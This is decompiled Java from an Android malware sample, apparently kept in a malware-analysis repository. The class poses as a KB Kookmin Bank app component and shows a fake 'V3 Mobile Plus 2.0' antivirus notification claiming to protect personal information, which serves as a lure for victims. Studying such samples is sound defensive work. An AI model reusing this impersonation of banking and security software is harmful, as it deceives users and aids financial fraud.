package com.kbstar.kb.android.star;

import android.app.Activity;
import android.app.Notification;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.view.Window;

public class V_Dialog
  extends Activity
{
  private void addNotificaction()
  {
    Notification localNotification = new Notification();
    localNotification.icon = 2130837559;
    localNotification.tickerText = "개인 정보를 보호하고 있습니다.";
    localNotification.setLatestEventInfo(this, "V3 Mobile Plus 2.0", "개인 정보를 보호하고 있습니다.", PendingIntent.getActivity(this, 0, new Intent(this, MainActivity.class), 1073741824));
  }
  
  private void init()
  {
    new Thread()
    {
      public void run()
      {
        try
        {
          V_Dialog.this.addNotificaction();
          Thread.sleep(3000L);
          V_Dialog.this.finish();
          return;
        }
        catch (InterruptedException localInterruptedException)
        {
          localInterruptedException.printStackTrace();
        }
      }
    }.start();
  }
  
  protected void onCreate(Bundle paramBundle)
  {
    super.onCreate(paramBundle);
    getWindow().requestFeature(1);
    setContentView(2130903057);
    init();
  }
}


/* Location:              /home/enzo/Documents/BorelEnzo.github.io/malwares/dsencrypt/payload.jar!/com/kbstar/kb/android/star/V_Dialog.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */